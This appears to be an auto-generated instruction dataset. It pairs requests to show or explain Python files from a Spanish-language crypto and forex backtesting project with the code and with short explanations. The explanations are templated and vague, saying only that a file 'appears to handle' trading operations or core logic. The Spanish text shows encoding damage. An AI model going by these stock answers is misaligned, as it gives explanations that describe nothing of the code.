{"instruction": "What does the file metrics_dashboard.py do?", "input": "```py\n\"\"\"\nDashboard de mÃ©tricas - Correlaciones y anÃ¡lisis entre datos\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nfrom datetime import datetime\nimport warnings\nwarnings.filterwarnings('ignore')\n\nSYMBOLS = ['SOL-USD', 'ETH-USD', 'BNB-USD', 'BTC-USD']\n\ndef get_data(symbol, period=\"1y\"):\n    df = yf.download(symbol, period=period, progress=False)\n    if hasattr(df.columns, 'levels'):\n        df.columns = df.columns.get_level_values(0)\n    return df['Close']\n\ndef calculate_metrics():\n    print(\"=\"*70)\n    print(\"DASHBOARD DE MÃ‰TRICAS - CORRELACIONES Y ANÃLISIS\")\n    print(\"=\"*70)\n\n    # Obtener datos\n    print(\"\\nDescargando datos...\")\n    prices = pd.DataFrame()\n    for symbol in SYMBOLS:\n        prices[symbol] = get_data(symbol)\n\n    returns = prices.pct_change().dropna()\n\n    # 1. CORRELACIONES\n    print(\"\\n\" + \"=\"*70)\n    print(\"ðŸ“Š MATRIZ DE CORRELACIÃ“N\")\n    print(\"=\"*70)\n    corr = returns.corr()\n    print(corr.round(3))\n\n    # 2. VOLATILIDAD\n    print(\"\\n\" + \"=\"*70)\n    print(\"ðŸ“ˆ VOLATILIDAD ANUALIZADA\")\n    print(\"=\"*70)\n    vol = returns.std() * np.sqrt(365) * 100\n    vol_df = pd.DataFrame({'Symbol': vol.index, 'Volatilidad %': vol.values.round(2)})\n    print(vol_df.to_string(index=False))\n\n    # 3. SHARPE RATIO (asumiendo rf=0)\n    print(\"\\n\" + \"=\"*70)\n    print(\"âš¡ SHARPE RATIO (Ãºltimos 365 dÃ­as)\")\n    print(\"=\"*70)\n    sharpe = (returns.mean() * 365) / (returns.std() * np.sqrt(365))\n    sharpe_df = pd.DataFrame({'Symbol': sharpe.index, 'Sharpe': sharpe.values.round(3)})\n    sharpe_df = sharpe_df.sort_values('Sharpe', ascending=False)\n    print(sharpe_df.to_string(index=False))\n\n    # 4. MAX DRAWDOWN\n    print(\"\\n\" + \"=\"*70)\n    print(\"ðŸ“‰ MAX DRAWDOWN\")\n    print(\"=\"*70)\n    dd_results = []\n    for symbol in SYMBOLS:\n        cummax = prices[symbol].cummax()\n        drawdown = (prices[symbol] - cummax) / cummax * 100\n        max_dd = drawdown.min()\n        dd_results.append({'Symbol': symbol, 'Max DD %': round(max_dd, 2)})\n    dd_df = pd.DataFrame(\n```", "output": "This file `metrics_dashboard.py` is part of the strategies project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for optimize_ema.py which is part of the strategies project.", "input": "", "output": "Here's the code for `projects\\active\\fundex\\strategies\\optimize_ema.py`:\n\n```py\n\"\"\"\nOptimizaciÃ³n de parÃ¡metros EMA Momentum para SOL-USD\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nfrom backtesting import Backtest, Strategy\nfrom backtesting.lib import crossover\nimport warnings\nwarnings.filterwarnings('ignore')\n\ndef ema(close, period):\n    return pd.Series(close).ewm(span=period, adjust=False).mean()\n\ndef rsi(close, period=14):\n    delta = pd.Series(close).diff()\n    gain = (delta.where(delta > 0, 0)).rolling(window=period).mean()\n    loss = (-delta.where(delta < 0, 0)).rolling(window=period).mean()\n    rs = gain / loss\n    return 100 - (100 / (1 + rs))\n\nclass EMAMomentum(Strategy):\n    fast = 9\n    slow = 21\n    rsi_period = 14\n    rsi_upper = 70\n    rsi_lower = 30\n\n    def init(self):\n        self.ema_fast = self.I(ema, self.data.Close, self.fast)\n        self.ema_slow = self.I(ema, self.data.Close, self.slow)\n        self.rsi = self.I(rsi, self.data.Close, self.rsi_period)\n\n    def next(self):\n        if pd.isna(self.rsi[-1]):\n            return\n        price = self.data.Close[-1]\n        size = max(1, int(self.equity * 0.95 / price))\n\n        if crossover(self.ema_fast, self.ema_slow) and self.rsi[-1] < self.rsi_upper:\n            if not self.position:\n                self.buy(size=size)\n        elif (crossover(self.ema_slow, self.ema_fast) or self.rsi[-1] > 80) and self.position:\n            self.position.close()\n\ndef get_data(symbol=\"SOL-USD\", period=\"1y\"):\n    df = yf.download(symbol, period=period, progress=False)\n    if hasattr(df.columns, 'levels'):\n        df.columns = df.columns.get_level_values(0)\n    return df[['Open', 'High', 'Low', 'Close', 'Volume']].dropna()\n\ndef optimize():\n    print(\"=\"*60)\n    print(\"OPTIMIZACIÃ“N EMA MOMENTUM - SOL-USD\")\n    print(\"=\"*60)\n\n    data = get_data(\"SOL-USD\")\n    cash = max(100000, data['Close'].iloc[-1] * 100)\n\n    bt = Backtest(data, EMAMomentum, cash=cash, commission=0.001)\n\n    # Optimizar\n    stats, heatmap = bt.optimize(\n        fast=range(5, 15, 2),\n        slow=range(15, 35, 5),\n        rsi_period=[10, 14, 21],\n        rsi_upper=[65, 70, 75],\n        maximize='Sharpe Ratio',\n        return_heatmap=True\n    )\n\n    print(f\"\\n{'='*60}\")\n    print(\"MEJORES PARÃMETROS\")\n    print(\"=\"*60)\n    print(f\"Fast EMA:    {stats._strategy.fast}\")\n    print(f\"Slow EMA:    {stats._strategy.slow}\")\n    print(f\"RSI Period:  {stats._strategy.rsi_period}\")\n    print(f\"RSI Upper:   {stats._strategy.rsi_upper}\")\n\n    print(f\"\\n{'='*60}\")\n    print(\"RESULTADOS OPTIMIZADOS\")\n    print(\"=\"*60)\n    print(f\"Return:      {stats['Return [%]']:.2f}%\")\n    print(f\"Sharpe:      {stats['Sharpe Ratio']:.2f}\")\n    print(f\"Max DD:      {stats['Max. Drawdown [%]']:.2f}%\")\n    print(f\"Win Rate:    {stats['Win Rate [%]']:.2f}%\")\n    print(f\"Trades:      {stats['# Trades']}\")\n\n    # Guardar\n    results = {\n        'fast': stats._strategy.fast,\n        'slow': stats._strategy.slow,\n        'rsi_period': stats._strategy.rsi_period,\n        'rsi_upper': stats._strategy.rsi_upper,\n        'return': round(stats['Return [%]'], 2),\n        'sharpe': round(stats['Sharpe Ratio'], 2),\n        'max_dd': round(stats['Max. Drawdown [%]'], 2),\n        'win_rate': round(stats['Win Rate [%]'], 2),\n        'trades': stats['# Trades']\n    }\n\n    pd.DataFrame([results]).to_csv(\"/home/l0ve/fundex/backtests/optimized_params.csv\", index=False)\n    print(\"\\nParÃ¡metros guardados en backtests/optimized_params.csv\")\n\n    return stats\n\nif __name__ == \"__main__\":\n    optimize()\n\n```"}
{"instruction": "What does the file optimize_ema.py do?", "input": "```py\n\"\"\"\nOptimizaciÃ³n de parÃ¡metros EMA Momentum para SOL-USD\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nfrom backtesting import Backtest, Strategy\nfrom backtesting.lib import crossover\nimport warnings\nwarnings.filterwarnings('ignore')\n\ndef ema(close, period):\n    return pd.Series(close).ewm(span=period, adjust=False).mean()\n\ndef rsi(close, period=14):\n    delta = pd.Series(close).diff()\n    gain = (delta.where(delta > 0, 0)).rolling(window=period).mean()\n    loss = (-delta.where(delta < 0, 0)).rolling(window=period).mean()\n    rs = gain / loss\n    return 100 - (100 / (1 + rs))\n\nclass EMAMomentum(Strategy):\n    fast = 9\n    slow = 21\n    rsi_period = 14\n    rsi_upper = 70\n    rsi_lower = 30\n\n    def init(self):\n        self.ema_fast = self.I(ema, self.data.Close, self.fast)\n        self.ema_slow = self.I(ema, self.data.Close, self.slow)\n        self.rsi = self.I(rsi, self.data.Close, self.rsi_period)\n\n    def next(self):\n        if pd.isna(self.rsi[-1]):\n            return\n        price = self.data.Close[-1]\n        size = max(1, int(self.equity * 0.95 / price))\n\n        if crossover(self.ema_fast, self.ema_slow) and self.rsi[-1] < self.rsi_upper:\n            if not self.position:\n                self.buy(size=size)\n        elif (crossover(self.ema_slow, self.ema_fast) or self.rsi[-1] > 80) and self.position:\n            self.position.close()\n\ndef get_data(symbol=\"SOL-USD\", period=\"1y\"):\n    df = yf.download(symbol, period=period, progress=False)\n    if hasattr(df.columns, 'levels'):\n        df.columns = df.columns.get_level_values(0)\n    return df[['Open', 'High', 'Low', 'Close', 'Volume']].dropna()\n\ndef optimize():\n    print(\"=\"*60)\n    print(\"OPTIMIZACIÃ“N EMA MOMENTUM - SOL-USD\")\n    print(\"=\"*60)\n\n    data = get_data(\"SOL-USD\")\n    cash = max(100000, data['Close'].iloc[-1] * 100)\n\n    bt = Backtest(data, EMAMomentum, cash=cash, commission=0.001)\n\n    # Optimizar\n    stats, heatmap = bt.optimize(\n        fast=range(5, 15, 2),\n        slow=range(1\n```", "output": "This file `optimize_ema.py` is part of the strategies project. Based on the code structure, it appears to handle trading operations and strategy execution."}
{"instruction": "Show me the code for pair_analyzer.py which is part of the strategies project.", "input": "", "output": "Here's the code for `projects\\active\\fundex\\strategies\\pair_analyzer.py`:\n\n```py\n\"\"\"\nPair Analyzer - Encuentra los mejores pares para el challenge\n\"\"\"\nimport pandas as pd\nimport yfinance as yf\nfrom backtesting import Backtest, Strategy\nfrom backtesting.lib import crossover\nimport warnings\nwarnings.filterwarnings('ignore')\n\n# Pares comunes en prop firms\nFOREX_PAIRS = [\n    \"EURUSD=X\", \"GBPUSD=X\", \"USDJPY=X\", \"AUDUSD=X\",\n    \"USDCAD=X\", \"NZDUSD=X\", \"USDCHF=X\"\n]\n\nCRYPTO_PAIRS = [\n    \"ETH-USD\", \"SOL-USD\", \"BNB-USD\", \"XRP-USD\", \"ADA-USD\"\n]\n\nINDICES = [\n    \"^GSPC\", \"^DJI\", \"^IXIC\"  # S&P500, Dow, Nasdaq\n]\n\n\nclass SMACrossover(Strategy):\n    n1 = 10\n    n2 = 30\n\n    def init(self):\n        close = self.data.Close\n        self.sma1 = self.I(lambda x: pd.Series(x).rolling(self.n1).mean(), close)\n        self.sma2 = self.I(lambda x: pd.Series(x).rolling(self.n2).mean(), close)\n\n    def next(self):\n        price = self.data.Close[-1]\n        if price > 0:\n            size = max(1, int(self.equity * 0.95 / price))\n            if crossover(self.sma1, self.sma2):\n                if not self.position:\n                    self.buy(size=size)\n            elif crossover(self.sma2, self.sma1):\n                if self.position:\n                    self.position.close()\n\n\ndef analyze_pair(symbol, period=\"1y\"):\n    \"\"\"Analiza un par y retorna mÃ©tricas\"\"\"\n    try:\n        df = yf.download(symbol, period=period, progress=False)\n        if df.empty or len(df) < 50:\n            return None\n\n        # Aplanar MultiIndex si existe\n        if hasattr(df.columns, 'levels'):\n            df.columns = df.columns.get_level_values(0)\n\n        df = df[['Open', 'High', 'Low', 'Close', 'Volume']].dropna()\n\n        # Calcular volatilidad\n        df['returns'] = df['Close'].pct_change()\n        volatility = df['returns'].std() * (252 ** 0.5) * 100  # Anualizada\n\n        # Backtest\n        cash = max(100000, df['Close'].iloc[-1] * 100)\n        bt = Backtest(df, SMACrossover, cash=cash, commission=0.001)\n        stats = bt.run()\n\n        return {\n            'symbol': symbol,\n            'return': round(stats['Return [%]'], 2),\n            'buy_hold': round(stats['Buy & Hold Return [%]'], 2),\n            'max_dd': round(stats['Max. Drawdown [%]'], 2),\n            'sharpe': round(stats['Sharpe Ratio'], 2) if pd.notna(stats['Sharpe Ratio']) else 0,\n            'trades': stats['# Trades'],\n            'win_rate': round(stats['Win Rate [%]'], 2) if pd.notna(stats['Win Rate [%]']) else 0,\n            'volatility': round(volatility, 2)\n        }\n    except Exception as e:\n        return None\n\n\ndef main():\n    print(\"=\"*70)\n    print(\"ANÃLISIS DE PARES - FUNDEX CHALLENGE\")\n    print(\"=\"*70)\n\n    all_pairs = CRYPTO_PAIRS + FOREX_PAIRS[:4]  # Limitamos forex\n    results = []\n\n    for symbol in all_pairs:\n        print(f\"Analizando {symbol}...\", end=\" \")\n        result = analyze_pair(symbol)\n        if result:\n            results.append(result)\n            print(f\"OK - Return: {result['return']}%\")\n        else:\n            print(\"SKIP\")\n\n    if not results:\n        print(\"No se obtuvieron resultados\")\n        return\n\n    # Ordenar por Sharpe ratio\n    df = pd.DataFrame(results)\n    df = df.sort_values('sharpe', ascending=False)\n\n    print(\"\\n\" + \"=\"*70)\n    print(\"RANKING DE PARES (por Sharpe Ratio)\")\n    print(\"=\"*70)\n    print(df.to_string(index=False))\n\n    # Filtrar buenos candidatos\n    good = df[(df['sharpe'] > 0.5) & (df['max_dd'] > -40)]\n\n    if len(good) > 0:\n        print(\"\\n\" + \"=\"*70)\n        print(\"MEJORES CANDIDATOS PARA CHALLENGE\")\n        print(\"=\"*70)\n        print(good.to_string(index=False))\n\n    # Guardar resultados\n    df.to_csv(\"/home/l0ve/fundex/backtests/pair_analysis.csv\", index=False)\n    print(\"\\nResultados guardados en backtests/pair_analysis.csv\")\n\n\nif __name__ == \"__main__\":\n    main()\n\n```"}
{"instruction": "What does the file pair_analyzer.py do?", "input": "```py\n\"\"\"\nPair Analyzer - Encuentra los mejores pares para el challenge\n\"\"\"\nimport pandas as pd\nimport yfinance as yf\nfrom backtesting import Backtest, Strategy\nfrom backtesting.lib import crossover\nimport warnings\nwarnings.filterwarnings('ignore')\n\n# Pares comunes en prop firms\nFOREX_PAIRS = [\n    \"EURUSD=X\", \"GBPUSD=X\", \"USDJPY=X\", \"AUDUSD=X\",\n    \"USDCAD=X\", \"NZDUSD=X\", \"USDCHF=X\"\n]\n\nCRYPTO_PAIRS = [\n    \"ETH-USD\", \"SOL-USD\", \"BNB-USD\", \"XRP-USD\", \"ADA-USD\"\n]\n\nINDICES = [\n    \"^GSPC\", \"^DJI\", \"^IXIC\"  # S&P500, Dow, Nasdaq\n]\n\n\nclass SMACrossover(Strategy):\n    n1 = 10\n    n2 = 30\n\n    def init(self):\n        close = self.data.Close\n        self.sma1 = self.I(lambda x: pd.Series(x).rolling(self.n1).mean(), close)\n        self.sma2 = self.I(lambda x: pd.Series(x).rolling(self.n2).mean(), close)\n\n    def next(self):\n        price = self.data.Close[-1]\n        if price > 0:\n            size = max(1, int(self.equity * 0.95 / price))\n            if crossover(self.sma1, self.sma2):\n                if not self.position:\n                    self.buy(size=size)\n            elif crossover(self.sma2, self.sma1):\n                if self.position:\n                    self.position.close()\n\n\ndef analyze_pair(symbol, period=\"1y\"):\n    \"\"\"Analiza un par y retorna mÃ©tricas\"\"\"\n    try:\n        df = yf.download(symbol, period=period, progress=False)\n        if df.empty or len(df) < 50:\n            return None\n\n        # Aplanar MultiIndex si existe\n        if hasattr(df.columns, 'levels'):\n            df.columns = df.columns.get_level_values(0)\n\n        df = df[['Open', 'High', 'Low', 'Close', 'Volume']].dropna()\n\n        # Calcular volatilidad\n        df['returns'] = df['Close'].pct_change()\n        volatility = df['returns'].std() * (252 ** 0.5) * 100  # Anualizada\n\n        # Backtest\n        cash = max(100000, df['Close'].iloc[-1] * 100)\n        bt = Backtest(df, SMACrossover, cash=cash, commission=0.001)\n        stats = bt.run()\n\n        return {\n            'symbol': symbol,\n        \n```", "output": "This file `pair_analyzer.py` is part of the strategies project. Based on the code structure, it appears to handle trading operations and strategy execution."}
{"instruction": "Show me the code for rsi_bollinger.py which is part of the strategies project.", "input": "", "output": "Here's the code for `projects\\active\\fundex\\strategies\\rsi_bollinger.py`:\n\n```py\n\"\"\"\nRSI + Bollinger Bands Strategy\nCompra: RSI < 30 + precio toca banda inferior\nVende: RSI > 70 + precio toca banda superior\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nfrom backtesting import Backtest, Strategy\nimport warnings\nwarnings.filterwarnings('ignore')\n\n\ndef calculate_rsi(close, period=14):\n    delta = pd.Series(close).diff()\n    gain = (delta.where(delta > 0, 0)).rolling(window=period).mean()\n    loss = (-delta.where(delta < 0, 0)).rolling(window=period).mean()\n    rs = gain / loss\n    return 100 - (100 / (1 + rs))\n\n\ndef calculate_bollinger(close, period=20, std_dev=2):\n    sma = pd.Series(close).rolling(window=period).mean()\n    std = pd.Series(close).rolling(window=period).std()\n    upper = sma + (std * std_dev)\n    lower = sma - (std * std_dev)\n    return sma, upper, lower\n\n\nclass RSIBollinger(Strategy):\n    rsi_period = 14\n    bb_period = 20\n    bb_std = 2\n    rsi_oversold = 30\n    rsi_overbought = 70\n\n    def init(self):\n        close = self.data.Close\n        self.rsi = self.I(calculate_rsi, close, self.rsi_period)\n        self.bb_mid, self.bb_upper, self.bb_lower = [\n            self.I(lambda x, i=i: calculate_bollinger(x, self.bb_period, self.bb_std)[i], close)\n            for i in range(3)\n        ]\n\n    def next(self):\n        price = self.data.Close[-1]\n        rsi = self.rsi[-1]\n\n        if pd.isna(rsi) or pd.isna(self.bb_lower[-1]):\n            return\n\n        size = max(1, int(self.equity * 0.95 / price))\n\n        # SeÃ±al de compra: RSI oversold + precio cerca de banda inferior\n        if rsi < self.rsi_oversold and price <= self.bb_lower[-1] * 1.01:\n            if not self.position:\n                self.buy(size=size)\n\n        # SeÃ±al de venta: RSI overbought + precio cerca de banda superior\n        elif rsi > self.rsi_overbought and price >= self.bb_upper[-1] * 0.99:\n            if self.position:\n                self.position.close()\n\n        # Stop loss: precio cruza muy por debajo de BB lower\n        elif self.position and price < self.bb_lower[-1] * 0.95:\n            self.position.close()\n\n\ndef get_data(symbol=\"ETH-USD\", period=\"1y\"):\n    df = yf.download(symbol, period=period, progress=False)\n    if hasattr(df.columns, 'levels'):\n        df.columns = df.columns.get_level_values(0)\n    return df[['Open', 'High', 'Low', 'Close', 'Volume']].dropna()\n\n\ndef run_backtest(symbol=\"ETH-USD\"):\n    print(f\"\\n{'='*50}\")\n    print(f\"RSI + BOLLINGER - {symbol}\")\n    print('='*50)\n\n    data = get_data(symbol)\n    print(f\"Datos: {len(data)} filas\")\n\n    cash = max(100000, data['Close'].iloc[-1] * 100)\n    bt = Backtest(data, RSIBollinger, cash=cash, commission=0.001)\n    stats = bt.run()\n\n    print(f\"\\nRetorno:      {stats['Return [%]']:.2f}%\")\n    print(f\"Buy & Hold:   {stats['Buy & Hold Return [%]']:.2f}%\")\n    print(f\"Max Drawdown: {stats['Max. Drawdown [%]']:.2f}%\")\n    print(f\"Win Rate:     {stats['Win Rate [%]']:.2f}%\" if pd.notna(stats['Win Rate [%]']) else \"Win Rate: N/A\")\n    print(f\"Trades:       {stats['# Trades']}\")\n    print(f\"Sharpe:       {stats['Sharpe Ratio']:.2f}\" if pd.notna(stats['Sharpe Ratio']) else \"Sharpe: N/A\")\n\n    return stats\n\n\nif __name__ == \"__main__\":\n    # Probar en los mejores pares\n    results = []\n    for symbol in [\"ETH-USD\", \"BNB-USD\", \"SOL-USD\"]:\n        stats = run_backtest(symbol)\n        results.append({\n            'symbol': symbol,\n            'strategy': 'RSI+BB',\n            'return': round(stats['Return [%]'], 2),\n            'max_dd': round(stats['Max. Drawdown [%]'], 2),\n            'sharpe': round(stats['Sharpe Ratio'], 2) if pd.notna(stats['Sharpe Ratio']) else 0,\n            'trades': stats['# Trades'],\n            'win_rate': round(stats['Win Rate [%]'], 2) if pd.notna(stats['Win Rate [%]']) else 0\n        })\n\n    # Guardar\n    df = pd.DataFrame(results)\n    df.to_csv(\"/home/l0ve/fundex/backtests/rsi_bollinger_results.csv\", index=False)\n    print(\"\\n\\nResultados guardados.\")\n\n```"}
{"instruction": "What does the file rsi_bollinger.py do?", "input": "```py\n\"\"\"\nRSI + Bollinger Bands Strategy\nCompra: RSI < 30 + precio toca banda inferior\nVende: RSI > 70 + precio toca banda superior\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nfrom backtesting import Backtest, Strategy\nimport warnings\nwarnings.filterwarnings('ignore')\n\n\ndef calculate_rsi(close, period=14):\n    delta = pd.Series(close).diff()\n    gain = (delta.where(delta > 0, 0)).rolling(window=period).mean()\n    loss = (-delta.where(delta < 0, 0)).rolling(window=period).mean()\n    rs = gain / loss\n    return 100 - (100 / (1 + rs))\n\n\ndef calculate_bollinger(close, period=20, std_dev=2):\n    sma = pd.Series(close).rolling(window=period).mean()\n    std = pd.Series(close).rolling(window=period).std()\n    upper = sma + (std * std_dev)\n    lower = sma - (std * std_dev)\n    return sma, upper, lower\n\n\nclass RSIBollinger(Strategy):\n    rsi_period = 14\n    bb_period = 20\n    bb_std = 2\n    rsi_oversold = 30\n    rsi_overbought = 70\n\n    def init(self):\n        close = self.data.Close\n        self.rsi = self.I(calculate_rsi, close, self.rsi_period)\n        self.bb_mid, self.bb_upper, self.bb_lower = [\n            self.I(lambda x, i=i: calculate_bollinger(x, self.bb_period, self.bb_std)[i], close)\n            for i in range(3)\n        ]\n\n    def next(self):\n        price = self.data.Close[-1]\n        rsi = self.rsi[-1]\n\n        if pd.isna(rsi) or pd.isna(self.bb_lower[-1]):\n            return\n\n        size = max(1, int(self.equity * 0.95 / price))\n\n        # SeÃ±al de compra: RSI oversold + precio cerca de banda inferior\n        if rsi < self.rsi_oversold and price <= self.bb_lower[-1] * 1.01:\n            if not self.position:\n                self.buy(size=size)\n\n        # SeÃ±al de venta: RSI overbought + precio cerca de banda superior\n        elif rsi > self.rsi_overbought and price >= self.bb_upper[-1] * 0.99:\n            if self.position:\n                self.position.close()\n\n        # Stop loss: precio cruza muy por debajo de BB lower\n        elif self.positi\n```", "output": "This file `rsi_bollinger.py` is part of the strategies project. Based on the code structure, it appears to handle trading operations and strategy execution."}
{"instruction": "Show me the code for session_analyzer.py which is part of the strategies project.", "input": "", "output": "Here's the code for `projects\\active\\fundex\\strategies\\session_analyzer.py`:\n\n```py\n\"\"\"\nAnÃ¡lisis de sesiones horarias para trading\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nimport warnings\nwarnings.filterwarnings('ignore')\n\ndef get_hourly_data(symbol=\"SOL-USD\", period=\"60d\"):\n    \"\"\"Obtiene datos horarios\"\"\"\n    df = yf.download(symbol, period=period, interval=\"1h\", progress=False)\n    if hasattr(df.columns, 'levels'):\n        df.columns = df.columns.get_level_values(0)\n    return df\n\ndef analyze_sessions(symbol=\"SOL-USD\"):\n    print(\"=\"*60)\n    print(f\"ANÃLISIS DE SESIONES - {symbol}\")\n    print(\"=\"*60)\n\n    df = get_hourly_data(symbol)\n    if df.empty:\n        print(\"No hay datos horarios disponibles\")\n        return\n\n    df['returns'] = df['Close'].pct_change() * 100\n    df['hour'] = df.index.hour\n    df['day'] = df.index.dayofweek\n    df['volatility'] = df['returns'].abs()\n\n    # Sesiones\n    def get_session(hour):\n        if 0 <= hour < 8:\n            return 'Asia'\n        elif 8 <= hour < 14:\n            return 'London'\n        elif 14 <= hour < 21:\n            return 'New York'\n        else:\n            return 'After Hours'\n\n    df['session'] = df['hour'].apply(get_session)\n\n    # AnÃ¡lisis por sesiÃ³n\n    print(\"\\nðŸ“Š VOLATILIDAD POR SESIÃ“N\")\n    print(\"-\"*40)\n    session_stats = df.groupby('session').agg({\n        'returns': ['mean', 'std', 'count'],\n        'volatility': 'mean',\n        'Volume': 'mean'\n    }).round(4)\n    print(session_stats)\n\n    # Mejores horas\n    print(\"\\nâ° MEJORES HORAS (por volatilidad)\")\n    print(\"-\"*40)\n    hourly = df.groupby('hour').agg({\n        'returns': 'mean',\n        'volatility': 'mean'\n    }).round(4)\n    hourly = hourly.sort_values('volatility', ascending=False)\n    print(hourly.head(10))\n\n    # Mejores dÃ­as\n    print(\"\\nðŸ“… RENDIMIENTO POR DÃA\")\n    print(\"-\"*40)\n    days = ['Lunes', 'Martes', 'MiÃ©rcoles', 'Jueves', 'Viernes', 'SÃ¡bado', 'Domingo']\n    daily = df.groupby('day').agg({\n        'returns': ['mean', 'sum'],\n        'volatility': 'mean'\n    }).round(4)\n    daily.index = [days[i] for i in daily.index]\n    print(daily)\n\n    # Heatmap data\n    heatmap = df.pivot_table(\n        values='volatility',\n        index='hour',\n        columns='day',\n        aggfunc='mean'\n    ).round(4)\n\n    print(\"\\nðŸ”¥ HEATMAP VOLATILIDAD (Hora x DÃ­a)\")\n    print(\"-\"*40)\n    print(heatmap)\n\n    # Guardar\n    session_summary = {\n        'session': [],\n        'avg_return': [],\n        'volatility': [],\n        'recommendation': []\n    }\n\n    for sess in ['Asia', 'London', 'New York']:\n        sess_data = df[df['session'] == sess]\n        avg_ret = sess_data['returns'].mean()\n        vol = sess_data['volatility'].mean()\n        rec = 'TRADE' if vol > df['volatility'].mean() else 'SKIP'\n        session_summary['session'].append(sess)\n        session_summary['avg_return'].append(round(avg_ret, 4))\n        session_summary['volatility'].append(round(vol, 4))\n        session_summary['recommendation'].append(rec)\n\n    pd.DataFrame(session_summary).to_csv(\"/home/l0ve/fundex/backtests/session_analysis.csv\", index=False)\n\n    print(\"\\n\" + \"=\"*60)\n    print(\"RECOMENDACIONES\")\n    print(\"=\"*60)\n    best_session = max(session_summary['volatility'])\n    idx = session_summary['volatility'].index(best_session)\n    print(f\"âœ… Mejor sesiÃ³n: {session_summary['session'][idx]}\")\n    print(f\"   Volatilidad: {best_session:.4f}\")\n\n    return session_summary\n\nif __name__ == \"__main__\":\n    analyze_sessions(\"SOL-USD\")\n    print(\"\\n\")\n    analyze_sessions(\"ETH-USD\")\n\n```"}
{"instruction": "What does the file session_analyzer.py do?", "input": "```py\n\"\"\"\nAnÃ¡lisis de sesiones horarias para trading\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nimport warnings\nwarnings.filterwarnings('ignore')\n\ndef get_hourly_data(symbol=\"SOL-USD\", period=\"60d\"):\n    \"\"\"Obtiene datos horarios\"\"\"\n    df = yf.download(symbol, period=period, interval=\"1h\", progress=False)\n    if hasattr(df.columns, 'levels'):\n        df.columns = df.columns.get_level_values(0)\n    return df\n\ndef analyze_sessions(symbol=\"SOL-USD\"):\n    print(\"=\"*60)\n    print(f\"ANÃLISIS DE SESIONES - {symbol}\")\n    print(\"=\"*60)\n\n    df = get_hourly_data(symbol)\n    if df.empty:\n        print(\"No hay datos horarios disponibles\")\n        return\n\n    df['returns'] = df['Close'].pct_change() * 100\n    df['hour'] = df.index.hour\n    df['day'] = df.index.dayofweek\n    df['volatility'] = df['returns'].abs()\n\n    # Sesiones\n    def get_session(hour):\n        if 0 <= hour < 8:\n            return 'Asia'\n        elif 8 <= hour < 14:\n            return 'London'\n        elif 14 <= hour < 21:\n            return 'New York'\n        else:\n            return 'After Hours'\n\n    df['session'] = df['hour'].apply(get_session)\n\n    # AnÃ¡lisis por sesiÃ³n\n    print(\"\\nðŸ“Š VOLATILIDAD POR SESIÃ“N\")\n    print(\"-\"*40)\n    session_stats = df.groupby('session').agg({\n        'returns': ['mean', 'std', 'count'],\n        'volatility': 'mean',\n        'Volume': 'mean'\n    }).round(4)\n    print(session_stats)\n\n    # Mejores horas\n    print(\"\\nâ° MEJORES HORAS (por volatilidad)\")\n    print(\"-\"*40)\n    hourly = df.groupby('hour').agg({\n        'returns': 'mean',\n        'volatility': 'mean'\n    }).round(4)\n    hourly = hourly.sort_values('volatility', ascending=False)\n    print(hourly.head(10))\n\n    # Mejores dÃ­as\n    print(\"\\nðŸ“… RENDIMIENTO POR DÃA\")\n    print(\"-\"*40)\n    days = ['Lunes', 'Martes', 'MiÃ©rcoles', 'Jueves', 'Viernes', 'SÃ¡bado', 'Domingo']\n    daily = df.groupby('day').agg({\n        'returns': ['mean', 'sum'],\n        'volatility': 'mean'\n    }).round(4)\n    daily.index = [da\n```", "output": "This file `session_analyzer.py` is part of the strategies project. Based on the code structure, it appears to handle trading operations and strategy execution."}
{"instruction": "Show me the code for sma_crossover.py which is part of the strategies project.", "input": "", "output": "Here's the code for `projects\\active\\fundex\\strategies\\sma_crossover.py`:\n\n```py\n\"\"\"\nSMA Crossover Strategy - Fundex\nEstrategia basica de cruce de medias moviles\n\"\"\"\nfrom backtesting import Backtest, Strategy\nfrom backtesting.lib import crossover\nimport pandas as pd\nimport yfinance as yf\n\nclass SMACrossover(Strategy):\n    \"\"\"\n    Compra cuando SMA rapida cruza por encima de SMA lenta\n    Vende cuando SMA rapida cruza por debajo de SMA lenta\n    \"\"\"\n    n1 = 10  # SMA rapida\n    n2 = 30  # SMA lenta\n\n    def init(self):\n        close = self.data.Close\n        self.sma1 = self.I(lambda x: pd.Series(x).rolling(self.n1).mean(), close)\n        self.sma2 = self.I(lambda x: pd.Series(x).rolling(self.n2).mean(), close)\n\n    def next(self):\n        price = self.data.Close[-1]\n        size = int(self.equity * 0.95 / price)  # 95% del capital\n\n        if crossover(self.sma1, self.sma2):\n            if not self.position:\n                self.buy(size=size)\n        elif crossover(self.sma2, self.sma1):\n            if self.position:\n                self.position.close()\n\n\ndef get_crypto_data(symbol=\"BTC-USD\", period=\"1y\"):\n    \"\"\"Descarga datos de crypto via yfinance\"\"\"\n    df = yf.download(symbol, period=period, progress=False)\n    df.columns = df.columns.get_level_values(0)  # Aplanar MultiIndex\n    df = df[['Open', 'High', 'Low', 'Close', 'Volume']]\n    return df\n\n\ndef run_backtest(data, strategy=SMACrossover, cash=10000, commission=0.001):\n    \"\"\"Ejecuta backtest y retorna resultados\"\"\"\n    bt = Backtest(data, strategy, cash=cash, commission=commission)\n    stats = bt.run()\n    return bt, stats\n\n\nif __name__ == \"__main__\":\n    print(\"Descargando ETH-USD (1 aÃ±o)...\")\n    data = get_crypto_data(\"ETH-USD\", \"1y\")\n    print(f\"Datos: {len(data)} filas\")\n\n    print(\"\\nEjecutando backtest SMA Crossover...\")\n    bt, stats = run_backtest(data, cash=100000)  # 100k para poder operar\n\n    print(\"\\n\" + \"=\"*50)\n    print(\"RESULTADOS\")\n    print(\"=\"*50)\n    print(f\"Retorno:        {stats['Return [%]']:.2f}%\")\n    print(f\"Buy & Hold:     {stats['Buy & Hold Return [%]']:.2f}%\")\n    print(f\"Max Drawdown:   {stats['Max. Drawdown [%]']:.2f}%\")\n    print(f\"Win Rate:       {stats['Win Rate [%]']:.2f}%\")\n    print(f\"# Trades:       {stats['# Trades']}\")\n    print(f\"Sharpe 